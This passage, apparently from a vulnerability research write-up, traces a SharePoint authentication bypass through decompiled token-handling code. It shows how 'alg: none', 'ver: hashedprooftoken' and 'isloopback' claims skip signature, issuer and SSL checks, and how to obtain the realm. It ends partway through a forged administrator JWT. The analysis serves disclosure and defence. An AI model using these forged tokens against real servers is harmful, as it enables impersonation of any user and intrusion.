</span></span><span class="line"><span class="cl">  <span class="n">dictionary</span><span class="p">.</span><span class="n">TryGetValue</span><span class="p">(</span><span class="s"><span class="hljs-string">"alg"</span></span><span class="p">,</span> <span class="k"><span class="hljs-keyword">out</span></span> <span class="n">text4</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [15]</span></span>
</span></span><span class="line"><span class="cl">  <span class="n">SecurityToken</span> <span class="n">securityToken</span> <span class="p">=</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(!</span><span class="n">StringComparer</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">text4</span><span class="p">,</span> <span class="s"><span class="hljs-string">"none"</span></span><span class="p">))</span> <span class="c1"><span class="hljs-comment">// [16]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="kt"><span class="hljs-keyword">string</span></span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">text3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k"><span class="hljs-keyword">throw</span></span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">SecurityTokenException</span><span class="p">(</span><span class="s"><span class="hljs-string">"Missing signature."</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">SecurityKeyIdentifier</span> <span class="n">signingKeyIdentifier</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">GetSigningKeyIdentifier</span><span class="p">(</span><span class="n">dictionary</span><span class="p">,</span> <span class="n">dictionary2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">SecurityToken</span> <span class="n">securityToken2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">base</span></span><span class="p">.</span><span class="n">Configuration</span><span class="p">.</span><span class="n">IssuerTokenResolver</span><span class="p">.</span><span class="n">TryResolveToken</span><span class="p">(</span><span class="n">signingKeyIdentifier</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">out</span></span> <span class="n">securityToken2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">securityToken2</span> <span class="p">==</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k"><span class="hljs-keyword">throw</span></span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">SecurityTokenException</span><span class="p">(</span><span class="s"><span class="hljs-string">"Invalid JWT token. Could not resolve issuer token."</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">securityToken</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">VerifySignature</span><span class="p">(</span><span class="kt"><span class="hljs-keyword">string</span></span><span class="p">.</span><span class="n">Format</span><span class="p">(</span><span class="n">CultureInfo</span><span class="p">.</span><span class="n">InvariantCulture</span><span class="p">,</span> <span class="s"><span class="hljs-string">"{0}.{1}"</span></span><span class="p">,</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="kt"><span class="hljs-keyword">object</span></span><span class="p">[]</span> <span class="p">{</span> <span class="n">text</span><span class="p">,</span> <span class="n">text2</span> <span class="p">}),</span> <span class="n">text3</span><span class="p">,</span> <span class="n">text4</span><span class="p">,</span> <span class="n">securityToken2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At <strong>[14]</strong>, the <code>JsonWebSecurityTokenHandler.CanReadToken()</code> method is first invoked to ensure that the <code>token</code> matches the regular expression <code>^[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]*$</code>. Basically, this checks that the user-supplied <code>token</code> resembles a valid JWT token with each portion (i.e. header, payload and signature) being Base64-encoded.</p>
<p>Afterwards, the header, payload and signature portions of the JWT token are extracted. Base64-decoding is then performed on header and payload portions before parsing them as JSON objects.</p>
<p>At <strong>[15]</strong>, the <code>alg</code> field (i.e. signing algorithm) is extracted from the header portion. For example, the value for the <code>alg</code> field is <code>HS256</code> if the Base64-decoded header portion is:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json hljs" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt"><span class="hljs-attr">"alg"</span></span><span class="p">:</span> <span class="s2"><span class="hljs-string">"HS256"</span></span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt"><span class="hljs-attr">"typ"</span></span><span class="p">:</span> <span class="s2"><span class="hljs-string">"JWT"</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The first part of the root cause of this authentication bypass vulnerability can be found at <strong>[16]</strong> ‚Äì there is a logic flaw when validating the signature of the JWT token provided. If the <code>alg</code> field is not set to  <code>none</code>, the method <code>VerifySignature()</code> is called to verify the signature of JWT token provided. However, if the <code>alg</code> is <code>none</code>, <strong>the signature validation check in <code>JsonWebSecurityTokenHandler.ReadTokenCore()</code> is skipped</strong>!</p>
<p>Back at <strong>[13]</strong>, <code>SPAudienceValidatingIdentityProofTokenHandler.ValidateAudience()</code> performs validation checks against the <code>aud</code> (audience) field from the header portion of the proof token supplied.</p>
<p>Below is an example of a valid value for the <code>aud</code> field:</p>
<pre tabindex="0"><code class="hljs apache"><span class="hljs-attribute">00000003</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">0</span>ff<span class="hljs-number">1</span>-ce<span class="hljs-number">00</span>-<span class="hljs-number">000000000000</span>/splab@<span class="hljs-number">3</span>b<span class="hljs-number">80</span>be<span class="hljs-number">6</span>c-<span class="hljs-number">6741</span>-<span class="hljs-number">4135</span>-<span class="hljs-number">9292</span>-afed<span class="hljs-number">8</span>df<span class="hljs-number">596</span>af
</code></pre><p>The format of the <code>aud</code> field is <code>&lt;client_id&gt;/&lt;hostname&gt;@&lt;realm&gt;</code>:</p>
<ul>
<li>The static value <code>00000003-0000-0ff1-ce00-000000000000</code> is accepted as a valid <code>&lt;client_id&gt;</code> for all SharePoint on-premise instances.</li>
<li><code>&lt;hostname&gt;</code> refers to the hostname of the SharePoint server (target) for the current HTTP request (e.g. <code>splab</code>)</li>
<li>The <code>&lt;realm&gt;</code> (e.g. <code>3b80be6c-6741-4135-9292-afed8df596af</code>) can be obtained from the <code>WWW-Authenticate</code> response header by sending a request to <code>/_api/web/</code> with header <code>Authorization: Bearer </code>.</li>
</ul>
<p>Below is an example of the HTTP request used to obtain the <code>&lt;realm&gt;</code> required to construct a valid value for the <code>aud</code> field:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http hljs" data-lang="http"><span class="line"><span class="cl"><span class="nf"><span class="hljs-keyword">GET</span></span> <span class="nn"><span class="hljs-string">/_api/web/</span></span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n"><span class="hljs-attribute">Connection</span></span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n"><span class="hljs-attribute">User-Agent</span></span><span class="o">:</span> <span class="l">python-requests/2.27.1</span>
</span></span><span class="line"><span class="cl"><span class="n"><span class="hljs-attribute">Host</span></span><span class="o">:</span> <span class="l">sharepoint</span>
</span></span><span class="line"><span class="cl"><span class="n"><span class="hljs-attribute">Authorization</span></span><span class="o">:</span> <span class="l">Bearer </span>
</span></span></code></pre></div><p>The HTTP response will include the <code>&lt;realm&gt;</code> in the <code>WWW-Authenticate</code> response header:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http hljs" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m"><span class="hljs-number">401</span></span> <span class="ne">Unauthorized</span>
</span></span><span class="line"><span class="cl"><span class="n"><span class="hljs-attribute">Content-Type</span></span><span class="o">:</span> <span class="l">text/plain; charset=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="err">//...</span>
</span></span><span class="line"><span class="cl"><span class="na"><span class="hljs-attribute">WWW-Authenticate</span>: Bearer realm</span><span class="o">=</span><span class="s">"3b80be6c-6741-4135-9292-afed8df596af",client_id="00000003-0000-0ff1-ce00-000000000000",trusted_issuers="00000003-0000-0ff1-ce00-000000000000@3b80be6c-6741-4135-9292-afed8df596af"</span>
</span></span></code></pre></div><p>After that, a new <code>SPIdentityProofToken</code> will be created from user-supplied access and proof tokens, and the control flows to <strong>[8]</strong>. 
At <strong>[8]</strong>, <code>identityProofTokenHandler</code> is returned by the <code>SPClaimsUtility.GetIdentityProofTokenHandler()</code> method:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">internal</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">SecurityTokenHandler</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">GetIdentityProofTokenHandler</span></span></span><span class="p"><span class="hljs-function">(<span class="hljs-params"></span>)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">securityTokenHandlerCollection</span><span class="p">.</span><span class="n">Where</span><span class="p">((</span><span class="n">SecurityTokenHandler</span> <span class="n">h</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="n">h</span><span class="p">.</span><span class="n">TokenType</span> <span class="p">==</span> <span class="k"><span class="hljs-keyword">typeof</span></span><span class="p">(</span><span class="n">SPIdentityProofToken</span><span class="p">)).</span><span class="n">First</span><span class="p">&lt;</span><span class="n">SecurityTokenHandler</span><span class="p">&gt;();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The implementation of the <code>SPClaimsUtility.GetIdentityProofTokenHandler()</code> method implies that the <code>identityProofTokenHandler</code> returned will be an instance of <code>SPIdentityProofTokenHandler</code>.</p>
<p>At <strong>[9]</strong>, <code>identityProofTokenHandler.ValidateToken(spidentityProofToken2)</code> will then flow to <code>SPIdentityProofTokenHandler.ValidateTokenIssuer()</code>.</p>
<p>In the <code>SPIdentityProofTokenHandler.ValidateTokenIssuer()</code> method, notice that if the <code>token</code> parameter is a hashed proof token, <strong>validation of the <code>issuer</code> field will be skipped</strong>!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">internal</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">ValidateTokenIssuer</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">JsonWebSecurityToken</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">token</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">bool</span></span> <span class="n">flag</span> <span class="p">=</span> <span class="n">VariantConfiguration</span><span class="p">.</span><span class="n">IsGlobalExpFeatureToggleEnabled</span><span class="p">(</span><span class="n">ExpFeatureId</span><span class="p">.</span><span class="n">AuthZenHashedProofToken</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">flag</span> <span class="p">&amp;&amp;</span> <span class="n">SPIdentityProofTokenUtilities</span><span class="p">.</span><span class="n">IsHashedProofToken</span><span class="p">(</span><span class="n">token</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULS</span><span class="p">.</span><span class="n">SendTraceTag</span><span class="p">(</span><span class="m"><span class="hljs-number">21559514</span></span><span class="n"><span class="hljs-number">U</span></span><span class="p">,</span> <span class="n">SPJsonWebSecurityBaseTokenHandler</span><span class="p">.</span><span class="n">Category</span><span class="p">,</span> <span class="n">ULSTraceLevel</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s"><span class="hljs-string">"Found hashed proof tokem, skipping issuer validation."</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">return</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">ValidateTokenIssuer</span><span class="p">(</span><span class="n">token</span><span class="p">.</span><span class="n">ActorToken</span><span class="p">.</span><span class="n">IssuerToken</span> <span class="k"><span class="hljs-keyword">as</span></span> <span class="n">X509SecurityToken</span><span class="p">,</span> <span class="n">token</span><span class="p">.</span><span class="n">ActorToken</span><span class="p">.</span><span class="n">Issuer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The implementation of the <code>SPIdentityProofTokenUtilities.IsHashedProofToken()</code> method is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">internal</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">bool</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">IsHashedProofToken</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">JsonWebSecurityToken</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">token</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">token</span> <span class="p">==</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">return</span></span> <span class="k"><span class="hljs-literal">false</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">token</span><span class="p">.</span><span class="n">Claims</span> <span class="p">==</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">return</span></span> <span class="k"><span class="hljs-literal">false</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">JsonWebTokenClaim</span> <span class="n">singleClaim</span> <span class="p">=</span> <span class="n">token</span><span class="p">.</span><span class="n">Claims</span><span class="p">.</span><span class="n">GetSingleClaim</span><span class="p">(</span><span class="s"><span class="hljs-string">"ver"</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">singleClaim</span> <span class="p">!=</span> <span class="k"><span class="hljs-literal">null</span></span> <span class="p">&amp;&amp;</span> <span class="n">singleClaim</span><span class="p">.</span><span class="n">Value</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">SPServerToServerProtocolConstants</span><span class="p">.</span><span class="n">HashedProofToken</span><span class="p">,</span> <span class="n">StringComparison</span><span class="p">.</span><span class="n">InvariantCultureIgnoreCase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Setting the <code>ver</code> field to <code>hashedprooftoken</code> in the payload portion of the JWT token makes the <code>SPIdentityProofTokenUtilities.IsHashedProofToken()</code> method return <code>true</code>, allowing the <code>issuer</code> field validation check to be subverted.</p>
<p>Back to <strong>[10]</strong>, <code>SPClaimsUtility.VerifyProofTokenEndPointUrl(tokenContext)</code> is called to verify the hash for current URL. The required value to be stored in the <code>endpointurl</code> field in the JWT payload portion can be derived by computing:</p>
<pre tabindex="0"><code class="hljs apache"><span class="hljs-attribute">base64_encode</span>(sha<span class="hljs-number">256</span>(request_url))
</code></pre><p>After executing <code>SPApplicationAuthenticationModule.TryExtractAndValidateToken()</code>, the code flows to the <code>SPApplicationAuthenticationModule.ConstructIClaimsPrincipalAndSetThreadIdentity()</code> method and reaches <strong>[4]</strong>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">bool</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">ConstructIClaimsPrincipalAndSetThreadIdentity</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">HttpApplication</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">httpApplication</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">HttpContext</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">httpContext</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">SPFederationAuthenticationModule</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">fam</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">out</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">tokenType</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(!</span><span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">TryExtractAndValidateToken</span><span class="p">(</span><span class="n">httpContext</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">out</span></span> <span class="n">spincomingTokenContext</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">out</span></span> <span class="n">spidentityProofToken</span><span class="p">))</span> <span class="c1"><span class="hljs-comment">// [3]</span></span>
</span></span><span class="line"><span class="cl">    <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">spincomingTokenContext</span><span class="p">.</span><span class="n">TokenType</span> <span class="p">!=</span> <span class="n">SPIncomingTokenType</span><span class="p">.</span><span class="n">Loopback</span> <span class="p">&amp;&amp;</span> <span class="n">httpApplication</span> <span class="p">!=</span> <span class="k"><span class="hljs-literal">null</span></span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="n">SPSecurityTokenServiceManager</span><span class="p">.</span><span class="n">LocalOrThrow</span><span class="p">.</span><span class="n">AllowOAuthOverHttp</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="n">Uri</span><span class="p">.</span><span class="n">UriSchemeHttps</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">SPAlternateUrl</span><span class="p">.</span><span class="n">ContextUri</span><span class="p">.</span><span class="n">Scheme</span><span class="p">,</span> <span class="n">StringComparison</span><span class="p">.</span><span class="n">OrdinalIgnoreCase</span><span class="p">))</span> <span class="c1"><span class="hljs-comment">// [4]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">SPApplicationAuthenticationModule</span><span class="p">.</span><span class="n">SendSSLRequiredResponse</span><span class="p">(</span><span class="n">httpApplication</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">JsonWebSecurityToken</span> <span class="n">jsonWebSecurityToken</span> <span class="p">=</span> <span class="n">spincomingTokenContext</span><span class="p">.</span><span class="n">SecurityToken</span> <span class="k"><span class="hljs-keyword">as</span></span> <span class="n">JsonWebSecurityToken</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">SignInProofToken</span><span class="p">(</span><span class="n">httpContext</span><span class="p">,</span> <span class="n">jsonWebSecurityToken</span><span class="p">,</span> <span class="n">spidentityProofToken</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [5]</span></span>
</span></span></code></pre></div><p>If the <code>spincomingTokenContext.TokenType</code> is not <code>spincomingTokenContext.Loopback</code> and the current HTTP request is not encrypted by SSL, an exception will be thrown. As such, the <code>isloopback</code> claim needs to be set to <code>true</code> within the spoofed JWT token to make <code>spincomingTokenContext.TokenType == spincomingTokenContext.Loopback</code>, thereby ensuring that no exceptions are thrown and the code continues to execute normally.</p>
<p>Subsequently, at <strong>[5]</strong>, the token will be passed into <code>SPApplicationAuthenticationModule.SignInProofToken()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">SignInProofToken</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">HttpContext</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">httpContext</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">JsonWebSecurityToken</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">token</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">SPIdentityProofToken</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">proofIdentityToken</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">SecurityContext</span><span class="p">.</span><span class="n">RunAsProcess</span><span class="p">(</span><span class="k"><span class="hljs-keyword">delegate</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Uri</span> <span class="n">contextUri</span> <span class="p">=</span> <span class="n">SPAlternateUrl</span><span class="p">.</span><span class="n">ContextUri</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SPAuthenticationSessionAttributes</span><span class="p">?</span> <span class="n">spauthenticationSessionAttributes</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">SPAuthenticationSessionAttributes</span><span class="p">?(</span><span class="n">SPAuthenticationSessionAttributes</span><span class="p">.</span><span class="n">IsBrowser</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">SecurityToken</span> <span class="n">securityToken</span> <span class="p">=</span> <span class="n">SPSecurityContext</span><span class="p">.</span><span class="n">SecurityTokenForProofTokenAuthentication</span><span class="p">(</span><span class="n">proofIdentityToken</span><span class="p">.</span><span class="n">IdentityToken</span><span class="p">,</span> <span class="n">proofIdentityToken</span><span class="p">.</span><span class="n">ProofToken</span><span class="p">,</span> <span class="n">spauthenticationSessionAttributes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">IClaimsPrincipal</span> <span class="n">claimsPrincipal</span> <span class="p">=</span> <span class="n">SPFederationAuthenticationModule</span><span class="p">.</span><span class="n">AuthenticateUser</span><span class="p">(</span><span class="n">securityToken</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This method will create an instance of <code>SecurityTokenForContext</code> from the user-supplied JWT token and send it to Security Token Service (STS) for authentication.
This is the most important part of the whole vulnerability ‚Äì if the STS accepts the spoofed JWT token, then it is possible to impersonate as any SharePoint user!</p>
<p>For brevity, the spoofed JWT token should be resemble the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json hljs" data-lang="json"><span class="line"><span class="cl"><span class="err">eyJhbGciOiAibm</span><span class="mi">9</span><span class="err">uZSJ</span><span class="mi">9</span><span class="err">.eyJpc</span><span class="mi">3</span><span class="err">MiOiIwMDAwMDAwMy</span><span class="mi">0</span><span class="err">wMDAwLTBmZjEtY</span><span class="mi">2</span><span class="err">UwMC</span><span class="mi">0</span><span class="err">wMDAwMDAwMDAwMDAiLCJhdWQiOiAgIjAwMDAwMDAzLTAwMDAtMGZmMS</span><span class="mi">1</span><span class="err">jZTAwLTAwMDAwMDAwMDAwMC</span><span class="mi">9</span><span class="err">zcGxhYkAzYjgwYmU</span><span class="mi">2</span><span class="err">Yy</span><span class="mi">02</span><span class="err">NzQxLTQxMzUtOTI</span><span class="mi">5</span><span class="err">Mi</span><span class="mi">1</span><span class="err">hZmVkOGRmNTk</span><span class="mi">2</span><span class="err">YWYiLCJuYmYiOiIxNjczNDEwMzM</span><span class="mi">0</span><span class="err">IiwiZXhwIjoiMTY</span><span class="mi">5</span><span class="err">MzQxMDMzNCIsIm</span><span class="mi">5</span><span class="err">hbWVpZCI</span><span class="mi">6</span><span class="err">ImMjLnd</span><span class="mi">8</span><span class="err">QWRtaW</span><span class="mi">5</span><span class="err">pc</span><span class="mi">3</span><span class="err">RyYXRvciIsICAgImh</span><span class="mi">0</span><span class="err">dHA</span><span class="mi">6</span><span class="err">Ly</span><span class="mi">9</span><span class="err">zY</span><span class="mi">2</span><span class="err">hlbWFzLm</span><span class="mi">1</span><span class="err">pY</span><span class="mi">3</span><span class="err">Jvc</span><span class="mi">29</span><span class="err">mdC</span><span class="mi">5</span><span class="err">jb</span><span class="mi">20</span><span class="err">vc</span><span class="mi">2</span><span class="err">hhcmVwb</span><span class="mi">2</span><span class="err">ludC</span><span class="mi">8</span><span class="err">yMDA</span><span class="mi">5</span><span class="err">LzA</span><span class="mi">4</span><span class="err">L</span><span class="mi">2</span><span class="err">NsYWltcy</span><span class="mi">91</span><span class="err">c</span><span class="mi">2</span><span class="err">VybG</span><span class="mi">9</span><span class="err">nb</span><span class="mi">25</span><span class="err">uYW</span><span class="mi">1</span><span class="err">lIjoiQWRtaW</span><span class="mi">5</span><span class="err">pc</span><span class="mi">3</span><span class="err">RyYXRvciIsICAgImFwcGlkYWNyIjoiMCIsICJpc</span><span class="mi">3</span><span class="err">VzZXIiOiIwIiwgImh</span><span class="mi">0</span><span class="err">dHA</span><span class="mi">6</span><span class="err">Ly</span><span class="mi">9</span><span class="err">zY</span><span class="mi">2</span><span class="err">hlbWFzLm</span><span class="mi">1</span><span class="err">pY</span><span class="mi">3</span><span class="err">Jvc</span><span class="mi">29</span><span class="err">mdC</span><span class="mi">5</span><span class="err">jb</span><span class="mi">20</span><span class="err">vb</span><span class="mi">2</span><span class="err">ZmaWNlLzIwMTIvMDEvbmFtZWlkaXNzdWVyIjoiQWNjZXNzVG</span><span class="mi">9</span><span class="err">rZW</span><span class="mi">4</span><span class="err">iLCAgInZlciI</span><span class="mi">6</span><span class="err">Imhhc</span><span class="mi">2</span><span class="err">hlZHByb</span><span class="mi">29</span><span class="err">mdG</span><span class="mi">9</span><span class="err">rZW</span><span 